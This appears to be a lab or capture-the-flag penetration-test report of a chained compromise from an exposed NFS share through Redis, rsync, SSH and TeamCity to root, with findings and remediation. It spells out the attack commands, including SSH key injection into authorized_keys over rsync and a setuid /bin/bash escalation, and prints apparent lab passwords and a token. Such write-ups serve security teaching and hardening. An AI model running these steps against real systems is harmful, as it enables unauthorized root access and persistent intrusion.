## Internal Infrastructure Compromise (NFS → Redis → rsync → TeamCity → Root)

---

## 1. Executive Summary

This report documents a full compromise of an internal Linux infrastructure through chained misconfigurations across multiple services.

The attack leveraged:
- Exposed NFS share
- Redis configuration leakage
- rsync credential reuse
- SSH key injection
- TeamCity misconfiguration running as root

**Impact:**
- Full root compromise
- Credential disclosure across services
- CI/CD takeover
- Persistent access via SSH

---

## 2. Attack Chain Overview

```
NFS → Redis Config → Credentials → Redis Access → rsync → SSH → TeamCity → Root
```

---

## 3. Initial Access – NFS

Mounted exposed share:

```bash
mount -t nfs <TARGET>:/share /mnt
```

Discovered sensitive configuration files.

---

## 4. Redis Credential Exposure

From configuration:

```
requirepass B65Hx562F@ggAZ@F
```

Also discovered rsync credentials:

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

---

## 5. Redis Exploitation

```bash
redis-cli -h <TARGET> -a B65Hx562F@ggAZ@F
```

Extracted:
- User flag
- Base64 encoded data

```bash
echo "<BASE64>" | base64 -d
```

---

## 6. rsync Exploitation

Enumerated rsync:

```bash
rsync rsync://rsync-connect@<TARGET>
```

Injected SSH key:

```bash
rsync mykey.pub rsync://rsync-connect@<TARGET>/files/sys-internal/.ssh/authorized_keys
```

---

## 7. SSH Access

```bash
ssh sys-internal@<TARGET>
```

---

## 8. Internal Service Discovery

```bash
ss -tunlp
```

Discovered TeamCity running on localhost.

---

## 9. Port Forwarding

```bash
ssh -L 8111:127.0.0.1:8111 sys-internal@<TARGET>
```

Access:
```
http://127.0.0.1:8111
```

---

## 10. TeamCity Exploitation

Sensitive tokens found in logs:

```bash
grep -r "token" /opt/teamcity/logs
```

Example token:
```
5834716828278477961
```

Authenticated as superuser.

---

## 11. Privilege Escalation

Created build configuration and executed:

```bash
chmod u+s /bin/bash
```

---

## 12. Root Access

```bash
/bin/bash -p
```

---

## 13. Findings & Severity

| Finding | Severity |
|--------|---------|
| NFS Exposure | High |
| Redis Credentials in Plaintext | Critical |
| Credential Reuse | Critical |
| rsync Weak Authentication | Critical |
| SSH Key Injection | Critical |
| TeamCity Running as Root | Critical |
| Token Leakage in Logs | Critical |

---

## 14. Key Weaknesses

- No network segmentation
- Services trusting localhost implicitly
- Credentials stored in plaintext
- Logs exposing sensitive tokens
- CI/CD system running as root

---

## 15. Remediation

- Restrict NFS access (IP filtering)
- Remove plaintext credentials
- Bind Redis to localhost + ACLs
- Disable or secure rsync authentication
- Protect SSH authorized_keys
- Run TeamCity with least privilege
- Secure logs and remove tokens
- Implement network segmentation

---

## 16. Conclusion

This compromise highlights how chaining minor misconfigurations leads to full system takeover.

**Key Insight:**
> Security failures across multiple services compound into critical compromise.

---

## 17. Evidence (Placeholders)

- [ ] NFS mount output
- [ ] Redis config file
- [ ] Redis access
- [ ] rsync key injection
- [ ] SSH session
- [ ] TeamCity dashboard
- [ ] Token extraction
- [ ] Root shell

---
